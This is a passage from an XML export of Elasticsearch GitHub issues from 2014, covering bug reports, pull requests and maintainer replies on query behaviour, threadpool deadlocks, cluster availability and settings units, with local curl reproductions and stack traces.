A more pernicious difference is that some features like the shard query cache are only enabled with the `count` search type.
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Parameter/field namespace clash in terms filter</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7629</link><project id="" key="" /><description>The `terms` filter accepts an `execution` parameter at the same level as the field name, which means that you can't have a field called `execution`.

We should change the structure of this filter to accept a format like this:

```
  "terms": {
    "fieldname": {
      "values": [ ....],
      "execution": "..."
   }
  }
```
</description><key id="42120928">7629</key><summary>Parameter/field namespace clash in terms filter</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">clintongormley</reporter><labels><label>adoptme</label><label>bug</label><label>low hanging fruit</label></labels><created>2014-09-06T16:56:46Z</created><updated>2015-11-21T18:29:10Z</updated><resolved>2015-11-21T18:29:10Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="clintongormley" created="2015-11-21T18:29:10Z" id="158670707">The execution parameter has been removed while merging filters with queries
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Resiliency: Add logging/safety when deleting files</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7628</link><project id="" key="" /><description>File.delete() is not great as it just returns a boolean if it succeeds or fails.

Instead we can use Files.delete/Files.deleteIfExists, which throws a real exception when it fails (e.g. DirectoryNotEmptyException, Access Denied, etc)

Brings in helpers from lucene (temporarily as XIOUtils):
- deleteFilesIfExist(File...): removes all the files, throwing the first exception with suppressions for other exceptions, but always attempts to remove all files
- deleteFilesIgnoringExceptions(File...): removes all files, suppressing all exceptions. good for when handling other exceptions
- rm(File...): recursive removal of all files, on any failure throws exception that contains each file name and the exception it hit.

Bans File.delete() with forbidden APIs.

This is also an opportunity to review all places in the codebase where we delete files, since they are all touched in this PR.
</description><key id="42116759">7628</key><summary>Resiliency: Add logging/safety when deleting files</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">rmuir</reporter><labels /><created>2014-09-06T13:35:10Z</created><updated>2014-11-11T15:44:44Z</updated><resolved>2014-11-11T15:44:19Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="rmuir" created="2014-09-06T13:51:47Z" id="54712784">Some possible bugs i might have made to look out for:
- Not being picky enough in tests (e.g. suppressing an exception when we should fail the test because it will just cause another confusing test failure if we can't delete the file)
- Calling Files.delete when it should be Files.deleteIfExists in source code (could cause excessive logging)

Additionally, since we have the chance now, we may want to also add any missing logging before we try to delete any file, so when debugging you can see all file deletes (in the successful case, too)
</comment><comment author="rjernst" created="2014-09-13T00:41:39Z" id="55476278">LGTM!
</comment><comment author="s1monw" created="2014-10-07T13:27:55Z" id="58183503">I left one comment other than that LGTM
</comment><comment author="s1monw" created="2014-11-11T15:44:19Z" id="62565423">this has been fixed by https://github.com/elasticsearch/elasticsearch/pull/8366
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>seems a bug on elasticsearch term query</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7627</link><project id="" key="" /><description>Hi, I've found something strange that may be a bug. I have some documents stored in http://localhost:9200/myindex/mytype

and each document contains a field called `country` which is a 2-letters country code such as "US", "CN", "DE"

Then I searched those document using query below

``` bash
curl -XGET 127.0.0.1:9200/myindex/_search?pretty -d '
{
  "query": {
    "filtered": {
      "filter": {
        "term": { "country": "US" }
      }
    }
  }
}'
```

and the returned result is always null even when there are lots of documents has field `"country": "US"`

``` json
{
  "took" : 1,
  "timed_out" : false,
  "_shards" : {
    "total" : 5,
    "successful" : 5,
    "failed" : 0
  },
  "hits" : {
    "total" : 0,
    "max_score" : null,
    "hits" : [ ]
  }
}
```

But when I search again using lower case, to my big surprise, it worked!

``` bash
curl -XGET 127.0.0.1:9200/myindex/_search?pretty -d '
{
  "query": {
    "filtered": {
      "filter": {
        "term": { "country": "us" }
      }
    }
  }
}'
```

And I've checked the returned object, all of them are correct.

So, I checked the elasticsearch documents for a while, but didn't find anything related. Is it a bug? Or a feature?
</description><key id="42115540">7627</key><summary>seems a bug on elasticsearch term query</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">zTrix</reporter><labels /><created>2014-09-06T12:24:27Z</created><updated>2014-09-06T14:18:44Z</updated><resolved>2014-09-06T12:45:46Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="clintongormley" created="2014-09-06T12:45:46Z" id="54711309">Hi @zTrix 

This is not a bug. Your `country` field is `analyzed` and it should be `not_analyzed`.  See http://www.elasticsearch.org/guide/en/elasticsearch/guide/current/mapping-intro.html#_literal_index_literal
</comment><comment author="zTrix" created="2014-09-06T14:18:44Z" id="54713469">Thank you very much for pointing out. It really works after I put the mappings.
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>[Bug] Elasticsearch accepting wrong JSON format</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7626</link><project id="" key="" /><description>Version - 1.3.2
Steps to reproduce

```
cat a.json 
{
    "user" : "vm"
}}
```

```
curl -XPOST "http://localhost:9200/config/alert" -d @a.json 
{
  "_index": "config",
  "_type": "alert",
  "_id": "0_UJFBy3SLOnfwCnS-D_Zg",
  "_version": 1,
  "created": true
}
```

Impact: Indexing is happening fine but on return the same wrong formatted JSON is returned and its breaking the application reading it as it expects properly formatted JSON string.
</description><key id="42114422">7626</key><summary>[Bug] Elasticsearch accepting wrong JSON format</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">Vineeth-Mohan</reporter><labels /><created>2014-09-06T11:07:40Z</created><updated>2014-09-06T18:41:06Z</updated><resolved>2014-09-06T18:41:06Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="clintongormley" created="2014-09-06T18:41:06Z" id="54724066">Hi @Vineeth-Mohan 

Thanks for reporting. This is a duplicate of #2315
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Internal: Searcher might be released twice in the case of a LONG GC</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7625</link><project id="" key="" /><description>In the case of a long GC searchers might be released twice once by the reaper and once by the actual releasing thread. It's a cosmetic problem since we protect from double releasing but we should fix it.

This has been seen in the field:

```
org.elasticsearch.ElasticsearchIllegalStateException: Double release 
at org.elasticsearch.index.engine.internal.InternalEngine$EngineSearcher.close(InternalEngine.java:1512) 
at org.elasticsearch.common.lease.Releasables.close(Releasables.java:45) 
at org.elasticsearch.common.lease.Releasables.close(Releasables.java:60) 
at org.elasticsearch.common.lease.Releasables.close(Releasables.java:65) 
at org.elasticsearch.search.internal.DefaultSearchContext.doClose(DefaultSearchContext.java:212) 
at org.elasticsearch.search.internal.SearchContext.close(SearchContext.java:96) 
at org.elasticsearch.search.SearchService.freeContext(SearchService.java:560) 
at org.elasticsearch.search.SearchService.access$100(SearchService.java:97) 
at org.elasticsearch.search.SearchService$Reaper.run(SearchService.java:957) 
```
</description><key id="42111189">7625</key><summary>Internal: Searcher might be released twice in the case of a LONG GC</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">{u'following_url': u'https://api.github.com/users/s1monw/following{/other_user}', u'events_url': u'https://api.github.com/users/s1monw/events{/privacy}', u'organizations_url': u'https://api.github.com/users/s1monw/orgs', u'url': u'https://api.github.com/users/s1monw', u'gists_url': u'https://api.github.com/users/s1monw/gists{/gist_id}', u'html_url': u'https://github.com/s1monw', u'subscriptions_url': u'https://api.github.com/users/s1monw/subscriptions', u'avatar_url': u'https://avatars0.githubusercontent.com/u/973334?v=4', u'repos_url': u'https://api.github.com/users/s1monw/repos', u'received_events_url': u'https://api.github.com/users/s1monw/received_events', u'gravatar_id': u'', u'starred_url': u'https://api.github.com/users/s1monw/starred{/owner}{/repo}', u'site_admin': False, u'login': u's1monw', u'type': u'User', u'id': 973334, u'followers_url': u'https://api.github.com/users/s1monw/followers'}</assignee><reporter username="">s1monw</reporter><labels><label>bug</label><label>v1.3.3</label><label>v1.4.0.Beta1</label><label>v2.0.0-beta1</label></labels><created>2014-09-06T07:23:51Z</created><updated>2014-09-12T09:50:41Z</updated><resolved>2014-09-08T18:43:33Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments /><attachments /><subtasks /><customfields /></item><item><title>Use `SEARCH` threadpool for potentially blocking operations</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7624</link><project id="" key="" /><description>In `SearchServiceTransportAction` we use `SAME` threadpool for
potentially blocking / longer running operations this can cause
slowdowns in response / requests processing or even deadlocks. This
commit uses `SEARCH` threadpool for all operations except of freeing
contexts.

Closes #7623
</description><key id="42110907">7624</key><summary>Use `SEARCH` threadpool for potentially blocking operations</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">s1monw</reporter><labels><label>:Internal</label><label>bug</label><label>v1.3.3</label><label>v1.4.0.Beta1</label><label>v2.0.0-beta1</label></labels><created>2014-09-06T07:04:25Z</created><updated>2015-06-07T18:48:39Z</updated><resolved>2014-09-08T09:38:36Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="kimchy" created="2014-09-06T12:10:19Z" id="54710544">this change would be a shame to do, since if you execute a 10 shard search, the first 9 will just spawn a thread to add the response to the datastrucutre and return, not really execute anything.

I think the actual second / third phase of execution, mainly the reduce of the second query phase, where aggs are being reduced, should be done on the SEARCH thread pool.
</comment><comment author="s1monw" created="2014-09-06T19:58:24Z" id="54726451">@kimchy this makes no sense indeed. the change was pretty naive too though... Yet, I tried to only execute the reduce phases / finish phases in a search thread but this was trickier that I thought. I pushed a working patch with a big nocommit - would love to discuss 
</comment><comment author="s1monw" created="2014-09-08T08:50:35Z" id="54791278">I removed the pending no-commits I think it's ready
</comment><comment author="kimchy" created="2014-09-08T09:23:23Z" id="54794241">lgtm
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Indexed Scripts/Templates: Indexed Scripts used during reduce phase sometimes hang</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7623</link><project id="" key="" /><description>Indexed scripts might need to get fetched via a GET call which is very cheap since those shards are local since they expand `[0-all]` but sometimes in the case of a node client holding no data we need to do a get call on the first get. Yet this get call seems to be executed on the transport thread and might deadlock since it needs that thread to process the get response. See stacktrace below... The problem here is that some of the actions in `SearchServiceTransportAction` don't use the `search` threadpool but use `SAME` instead which can cause this issue. We should use `SEARCH` instead for the most of the operations except of free context I guess.

```
2&gt; "elasticsearch[node_s2][local_transport][T#1]" ID=1421 WAITING on org.elasticsearch.common.util.concurrent.BaseFuture$Sync@2b1fdd72
  2&gt;    at sun.misc.Unsafe.park(Native Method)
  2&gt;    - waiting on org.elasticsearch.common.util.concurrent.BaseFuture$Sync@2b1fdd72
  2&gt;    at java.util.concurrent.locks.LockSupport.park(LockSupport.java:175)
  2&gt;    at java.util.concurrent.locks.AbstractQueuedSynchronizer.parkAndCheckInterrupt(AbstractQueuedSynchronizer.java:836)
  2&gt;    at java.util.concurrent.locks.AbstractQueuedSynchronizer.doAcquireSharedInterruptibly(AbstractQueuedSynchronizer.java:997)
  2&gt;    at java.util.concurrent.locks.AbstractQueuedSynchronizer.acquireSharedInterruptibly(AbstractQueuedSynchronizer.java:1304)
  2&gt;    at org.elasticsearch.common.util.concurrent.BaseFuture$Sync.get(BaseFuture.java:274)
  2&gt;    at org.elasticsearch.common.util.concurrent.BaseFuture.get(BaseFuture.java:113)
  2&gt;    at org.elasticsearch.action.support.AdapterActionFuture.actionGet(AdapterActionFuture.java:45)
  2&gt;    at org.elasticsearch.script.ScriptService.getScriptFromIndex(ScriptService.java:377)
  2&gt;    at org.elasticsearch.script.ScriptService.compile(ScriptService.java:295)
  2&gt;    at org.elasticsearch.script.ScriptService.executable(ScriptService.java:457)
  2&gt;    at org.elasticsearch.search.aggregations.metrics.scripted.InternalScriptedMetric.reduce(InternalScriptedMetric.java:99)
  2&gt;    at org.elasticsearch.search.aggregations.InternalAggregations.reduce(InternalAggregations.java:140)
  2&gt;    at org.elasticsearch.search.controller.SearchPhaseController.merge(SearchPhaseController.java:374)
  2&gt;    at org.elasticsearch.action.search.type.TransportSearchDfsQueryThenFetchAction$AsyncAction.innerFinishHim(TransportSearchDfsQueryThenFetchAction.java:209)
  2&gt;    at org.elasticsearch.action.search.type.TransportSearchDfsQueryThenFetchAction$AsyncAction.finishHim(TransportSearchDfsQueryThenFetchAction.java:196)
  2&gt;    at org.elasticsearch.action.search.type.TransportSearchDfsQueryThenFetchAction$AsyncAction$2.onResult(TransportSearchDfsQueryThenFetchAction.java:172)
  2&gt;    at org.elasticsearch.action.search.type.TransportSearchDfsQueryThenFetchAction$AsyncAction$2.onResult(TransportSearchDfsQueryThenFetchAction.java:166)
  2&gt;    at org.elasticsearch.search.action.SearchServiceTransportAction$18.handleResponse(SearchServiceTransportAction.java:440)
  2&gt;    at org.elasticsearch.search.action.SearchServiceTransportAction$18.handleResponse(SearchServiceTransportAction.java:431)
  2&gt;    at org.elasticsearch.transport.local.LocalTransport$3.run(LocalTransport.java:322)
  2&gt;    at com.google.common.util.concurrent.MoreExecutors$DirectExecutorService.execute(MoreExecutors.java:299)
  2&gt;    at org.elasticsearch.transport.local.LocalTransport.handleParsedResponse(LocalTransport.java:317)
  2&gt;    at org.elasticsearch.test.transport.AssertingLocalTransport.handleParsedResponse(AssertingLocalTransport.java:59)
  2&gt;    at org.elasticsearch.transport.local.LocalTransport.handleResponse(LocalTransport.java:313)
  2&gt;    at org.elasticsearch.transport.local.LocalTransport.messageReceived(LocalTransport.java:238)
  2&gt;    at org.elasticsearch.transport.local.LocalTransportChannel$1.run(LocalTransportChannel.java:78)
  2&gt;    at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1142)
  2&gt;    at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617)
  2&gt;    at java.lang.Thread.run(Thread.java:745)
  2&gt;    Locked synchronizers:
  2&gt;    - java.util.concurrent.ThreadPoolExecutor$Worker@2339bcc9
  2&gt; 
```
</description><key id="42110737">7623</key><summary>Indexed Scripts/Templates: Indexed Scripts used during reduce phase sometimes hang</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">{u'following_url': u'https://api.github.com/users/s1monw/following{/other_user}', u'events_url': u'https://api.github.com/users/s1monw/events{/privacy}', u'organizations_url': u'https://api.github.com/users/s1monw/orgs', u'url': u'https://api.github.com/users/s1monw', u'gists_url': u'https://api.github.com/users/s1monw/gists{/gist_id}', u'html_url': u'https://github.com/s1monw', u'subscriptions_url': u'https://api.github.com/users/s1monw/subscriptions', u'avatar_url': u'https://avatars0.githubusercontent.com/u/973334?v=4', u'repos_url': u'https://api.github.com/users/s1monw/repos', u'received_events_url': u'https://api.github.com/users/s1monw/received_events', u'gravatar_id': u'', u'starred_url': u'https://api.github.com/users/s1monw/starred{/owner}{/repo}', u'site_admin': False, u'login': u's1monw', u'type': u'User', u'id': 973334, u'followers_url': u'https://api.github.com/users/s1monw/followers'}</assignee><reporter username="">s1monw</reporter><labels><label>bug</label><label>v1.3.3</label><label>v1.4.0.Beta1</label><label>v2.0.0-beta1</label></labels><created>2014-09-06T07:01:01Z</created><updated>2014-09-12T09:50:41Z</updated><resolved>2014-09-08T09:38:36Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments /><attachments /><subtasks /><customfields /></item><item><title>Cannot provide HA on a 2 node cluster</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7622</link><project id="" key="" /><description>I am creating this issue to bring notice to the fact that ES does not seem to have a way to form a 2 node cluster and provide HA as well. 

For instance, let us assume the simple case, where I have two nodes in a cluster, Node A and Node B with only 1 shard per index configured.In addition, I have minimum_master_nodes set to 1, since I want the cluster to be functional when one node goes down.

 In my case, Node A is the master and has the primary shard, &amp;  Node B has the replica shard. Now, if I bring down Node A, Node B assumes the master status and gets the primary shard status. If I insert some new data into this cluster, then they get inserted fine within the primary shard on Node B. Now for instance, if Node B goes down before I bring up Node A, then Node A gets the primary shard status.(as expected it will not have the newly added data). Later, whenever Node B comes back up, Node A will wipe out the newly added data in Node B. There does not seem to be a good way to recover the data that was newly added. (Other than may be restoring from a backup)

Is there any plan to resolve this issue so that 2 node instances can still have HA, or is it mandatory to have a minimum of 3 nodes to get HA?

Note: If Node A is brought up before Node B goes down, then the cluster is all fine and dandy, and has the newly added data.
</description><key id="42105208">7622</key><summary>Cannot provide HA on a 2 node cluster</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">RobbieHer</reporter><labels /><created>2014-09-06T01:28:19Z</created><updated>2014-09-06T18:37:38Z</updated><resolved>2014-09-06T18:37:38Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="clintongormley" created="2014-09-06T18:37:38Z" id="54723953">Hi @RobbieHer 

No there are no plans to support this.  You need a minimum of three nodes to make this work.
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Querying an alias associated with multiple indices throws an ElasticsearchIllegalArgumentException</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7621</link><project id="" key="" /><description>According to https://github.com/elasticsearch/elasticsearch/issues/510, if an alias is associated with multiple indices (in my case, 7), it should query across all those indices. However, my query receives only this:

```
org.elasticsearch.ElasticsearchIllegalArgumentException: Alias [myindex] has more than one index associated with it
```

Is this a bug, or am I simply doing something incorrectly?

**This query performs only a search, nothing is written**. Query below:

```
// Java Client, "index" being my alias
esClient.prepareGet(index, type, id).execute().actionGet();
```

Currently using v1.3.1.

**Update:** Seems that this may only be an issue with `esClient.prepareGet` (i.e. the Search API does this correctly), which leads me to believe it's probably me doing something wrong.
</description><key id="42102846">7621</key><summary>Querying an alias associated with multiple indices throws an ElasticsearchIllegalArgumentException</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">whitfin</reporter><labels /><created>2014-09-06T00:09:58Z</created><updated>2014-09-06T17:10:26Z</updated><resolved>2014-09-06T05:50:06Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="dadoonet" created="2014-09-06T05:50:06Z" id="54703572">A GET is not a SEARCH.
That's indeed why you get that error.

If you want to search by id (and not get by id), you could try with this: http://www.elasticsearch.org/guide/en/elasticsearch/reference/current/query-dsl-ids-filter.html

Closing as I don't think it's an issue.
</comment><comment author="whitfin" created="2014-09-06T17:10:26Z" id="54720941">@dadoonet Ah, I wasn't sure whether GET was supposed to support multiple indices as well as SEARCH - my apologies if I missed where that's covered. Thanks for the clarification!
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>dynamic scripting update is disabled by default so reflect it to "getting started" doc.</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7620</link><project id="" key="" /><description>Since dynamic scripting update is disabled by default as of 1.3.0, reference documentation should reflect it. Updated relevant section by removing few lines which explains update by dynamic scripting.
</description><key id="42092738">7620</key><summary>dynamic scripting update is disabled by default so reflect it to "getting started" doc.</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">combacsa</reporter><labels /><created>2014-09-05T21:32:16Z</created><updated>2014-09-06T18:32:16Z</updated><resolved>2014-09-06T18:32:16Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="clintongormley" created="2014-09-06T18:32:16Z" id="54723786">Hi @combacsa 

Thanks for the PR, but dynamic scripting is not disabled by default in 1.3, just in 1.2.  In 1.3 we enable sandboxed scripting languages like Groovy and Lucene expressions.  In 1.4, Groovy will become the new default (currently it is still mvel).

thanks anyway
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>RestAPI: Change validation exceptions to respond with 400 status instead of 500</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7619</link><project id="" key="" /><description>Validation errors are clearly in the realm of client errors (a program with the request).  Thus they should return a 4xx response code.
</description><key id="42086693">7619</key><summary>RestAPI: Change validation exceptions to respond with 400 status instead of 500</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">rjernst</reporter><labels /><created>2014-09-05T20:29:01Z</created><updated>2015-01-21T23:22:21Z</updated><resolved>2014-09-07T05:02:55Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="s1monw" created="2014-09-05T20:29:59Z" id="54677360">to me that is the right thing to do - @clintongormley what do you think? we should return 400 instead of 500 in the case the request doesn't validate?
</comment><comment author="kimchy" created="2014-09-05T21:05:19Z" id="54681317">LGTM
</comment><comment author="clintongormley" created="2014-09-06T18:30:23Z" id="54723720">LGTM
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Add explicit error when PUT mapping API is given an empty request body.</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7618</link><project id="" key="" /><description>I also added validation for an empty type, and added tests (just for validation for now).

closes #7536
</description><key id="42084717">7618</key><summary>Add explicit error when PUT mapping API is given an empty request body.</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">rjernst</reporter><labels><label>:Mapping</label><label>bug</label><label>v1.4.0.Beta1</label><label>v2.0.0-beta1</label></labels><created>2014-09-05T20:07:34Z</created><updated>2015-06-07T18:48:52Z</updated><resolved>2014-09-05T20:31:01Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="s1monw" created="2014-09-05T20:15:12Z" id="54675681">LGTM
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>multi-field with path just_name not returning expected documents with _all</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7617</link><project id="" key="" /><description>Below is a script to recreate an issue that is not returning the expected documents.

Also have the issue when passing multiple types, but haven't been able to recreate just yet. Working on how to recreate it with a simple script however.

Thanks!

```
#!/bin/bash

curl -XPUT 'http://localhost:9200/demo'

curl -XPOST 'http://localhost:9200/_bulk?refresh=true' -d '
{ "index" :  {"_index":"demo","_type":"user","_id":"12033031"} }
{"name":"unit test user sEla3"}'

curl -XPOST 'http://localhost:9200/_bulk?refresh=true' -d '
{ "index" :  {"_index":"demo","_type":"project","_id":"2033031"} }
{"name":"unit test project dsEoa"}
'

curl -XPUT "http://localhost:9200/demo/project/_mapping" -d '{
    "project" : {
        "properties" : {
            "name": {
                "type" : "multi_field",
                "path": "just_name",
                "fields" : {
                    "name": { "type": "string" },
                    "project" : {"type" : "string", "index" : "not_analyzed" },
                    "project_name" : {"type" : "string" }
                }
            }           
        }
    }
}'

curl -XPOST 'http://localhost:9200/_bulk?refresh=true' -d '
{ "index" :  {"_index":"demo","_type":"project","_id":"2033031"} }
{"name":"unit test project dsEoa"}
'

echo ""
echo "Expect 1 document, 1 document returned"
curl -XPOST 'http://localhost:9200/demo/project,user/_search?pretty=true' -d '
{
"query": {
    "query_string": {
      "query": "project.name:\"unit test project dseoa\""
    }
  }
}
'

echo "Expect 1 document, 0 documents returned"
curl -XPOST 'http://localhost:9200/demo/_all/_search?pretty=true' -d '
{
"query": {
    "query_string": {
      "query": "project.name:\"unit test project dseoa\""
    }
  }
}
'

echo "Expect 1 document, 1 documents returned"
curl -XPOST 'http://localhost:9200/demo/_search?pretty=true' -d '
{
"query": {
    "query_string": {
      "query": "project.name:\"unit test project dseoa\""
    }
  }
}
'
```
</description><key id="42075897">7617</key><summary>multi-field with path just_name not returning expected documents with _all</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">billumina</reporter><labels /><created>2014-09-05T18:32:24Z</created><updated>2014-09-06T18:22:09Z</updated><resolved>2014-09-06T18:22:09Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="clintongormley" created="2014-09-06T18:22:09Z" id="54723480">Hi @billumina 

First, multi_fields, path: full/just_name, and index_name are deprecated.  They have been replaced by `fields` and `copy_to`.

second, if you want to specify all types, then you can just leave the type blank, as in : 

```
GET /demo/_search
```

Your failing request was looking for a type called `_all`.
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>[core] for settings that take units (byte size, time), we should require a unit</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7616</link><project id="" key="" /><description>Too many users have fallen into the trap of thinking refresh_interval of "1" means "1s" but in fact it means "1ms" ... I think it should be a hard error if this setting (and maybe any setting that takes units) is missing the units?

We should require that the unit is explicit so users don't fall into this trap?
</description><key id="42075291">7616</key><summary>[core] for settings that take units (byte size, time), we should require a unit</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">{u'following_url': u'https://api.github.com/users/mikemccand/following{/other_user}', u'events_url': u'https://api.github.com/users/mikemccand/events{/privacy}', u'organizations_url': u'https://api.github.com/users/mikemccand/orgs', u'url': u'https://api.github.com/users/mikemccand', u'gists_url': u'https://api.github.com/users/mikemccand/gists{/gist_id}', u'html_url': u'https://github.com/mikemccand', u'subscriptions_url': u'https://api.github.com/users/mikemccand/subscriptions', u'avatar_url': u'https://avatars0.githubusercontent.com/u/796508?v=4', u'repos_url': u'https://api.github.com/users/mikemccand/repos', u'received_events_url': u'https://api.github.com/users/mikemccand/received_events', u'gravatar_id': u'', u'starred_url': u'https://api.github.com/users/mikemccand/starred{/owner}{/repo}', u'site_admin': False, u'login': u'mikemccand', u'type': u'User', u'id': 796508, u'followers_url': u'https://api.github.com/users/mikemccand/followers'}</assignee><reporter username="">mikemccand</reporter><labels><label>:Settings</label><label>breaking</label><label>enhancement</label><label>v2.0.0-beta1</label></labels><created>2014-09-05T18:25:44Z</created><updated>2015-12-10T09:48:47Z</updated><resolved>2015-06-04T18:03:23Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="kimchy" created="2014-09-05T18:28:47Z" id="54663160">+1, we should do it globally on the `Settings` class to begin with (with relevant flags on the relevant type parsers). I am unsure about breaking backward comp. for this, we could check in the settings for a specific setting, and if its set, still allow non unit settings? This will allow users to revert to the old behavior until they figure out how to change them. Some settings might not be dynamic to update on the index level...
</comment><comment author="mikemccand" created="2014-09-05T18:37:27Z" id="54664205">That's a good point @kimchy, would not be nice to make this a hard break when it's a write-once setting.

So maybe we default to "strict" but add a back-compat setting that user could enable if it's too hard / not possible to add units to their existing settings?
</comment><comment author="kimchy" created="2014-09-05T20:57:52Z" id="54680541">@mikemccand make sense to me
</comment><comment author="clintongormley" created="2014-09-06T18:29:09Z" id="54723688">+1
</comment><comment author="mikemccand" created="2014-09-08T10:03:15Z" id="54798205">I moved this to 1.5.0 ... too dangerous to push into 1.4.0.
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>ES package, plugin script does not read the elasticsearch.yml file to determine where path.plugins points to</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7615</link><project id="" key="" /><description>I've reproduced this on the DEB package (might likely applies to the RPM package also).

I ran across a scenario wherein user was using the DEB package. Then they opened the `/etc/elasticsearch/elasticsearch.yml` file and changed `path.plugins` to point to a different folder (anything really)

After this, they installed Marvel (or any plugin for that matter). Unfortunately, the plugin was installed into `/usr/share/elasticsearch/plugins` instead of picking up the `path.plugins` override in the elasticsearch.yml file. Thus when starting ES, the plugin does not load correctly.

This can be potentially fixed by changing the plugin script line to:

```
exec $JAVA $JAVA_OPTS -Xmx64m -Xms16m -Delasticsearch -Des.path.home="$ES_HOME" -Des.config="/etc/elasticsearch/elasticsearch.yml" $properties -cp "$ES_HOME/lib/*" org.elasticsearch.plugins.PluginManager $args
```

I'm not 100% sure if this has other implications or is the right approach here.
</description><key id="42073080">7615</key><summary>ES package, plugin script does not read the elasticsearch.yml file to determine where path.plugins points to</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">bly2k</reporter><labels><label>adoptme</label><label>bug</label></labels><created>2014-09-05T18:02:04Z</created><updated>2014-10-15T19:48:30Z</updated><resolved>2014-10-15T19:48:30Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="markwalkom" created="2014-10-08T23:55:27Z" id="58446196">Someone also just ran into this on IRC as well.
</comment><comment author="dadoonet" created="2014-10-09T09:48:03Z" id="58486388">I think this issue is related to #7946 as well.
Not sure if we should keep both opened.
</comment><comment author="clintongormley" created="2014-10-15T19:48:30Z" id="59264629">Yeah, this is a duplicate. Closing in favour of #7946 
